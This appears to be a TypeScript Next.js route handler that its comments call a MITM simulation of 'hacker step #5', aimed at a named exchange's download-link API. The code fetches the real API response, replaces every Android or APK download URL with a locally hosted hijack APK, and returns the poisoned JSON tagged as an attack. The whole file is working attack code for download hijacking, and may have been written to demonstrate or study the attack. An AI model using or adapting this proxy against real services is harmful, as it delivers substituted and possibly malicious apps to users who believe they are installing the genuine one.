import { NextRequest, NextResponse } from "next/server";
import { HIJACK_APK_PATH, REAL_DOWNLOAD_API } from "@/lib/config";

/**
 * MITM simulation — exact hacker step #5:
 * Intercept GET api.thsexcex.com/api/downloadlink and swap APK URL.
 */
export async function GET(req: NextRequest) {
  const host = req.headers.get("host") || "localhost:3000";
  const proto = req.headers.get("x-forwarded-proto") || "http";
  const hijackUrl = `${proto}://${host}${HIJACK_APK_PATH}`;

  let original: Record<string, unknown> = {};
  try {
    const res = await fetch(REAL_DOWNLOAD_API, {
      headers: { Accept: "application/json" },
      cache: "no-store",
    });
    original = await res.json();
  } catch (e) {
    return NextResponse.json(
      {
        success: false,
        error: String(e),
        _mitm: true,
        note: "Real API unreachable — using fallback hijack response",
        data: [{ type: "android", url: hijackUrl }],
      },
      { status: 200 }
    );
  }

  const poisoned = JSON.parse(JSON.stringify(original)) as {
    data?: Array<{ type?: string; url?: string }>;
  };

  const swapped: Array<{ type: string; from: string; to: string }> = [];

  if (Array.isArray(poisoned.data)) {
    for (const row of poisoned.data) {
      const t = String(row.type || "").toLowerCase();
      if (t.includes("android") || t === "apk") {
        const from = String(row.url || "");
        row.url = hijackUrl;
        swapped.push({ type: t, from, to: hijackUrl });
      }
    }
  }

  return NextResponse.json({
    ...poisoned,
    _mitm: true,
    _attack: "api_downloadlink_poison",
    _swapped: swapped,
    _original_snapshot: original,
  });
}
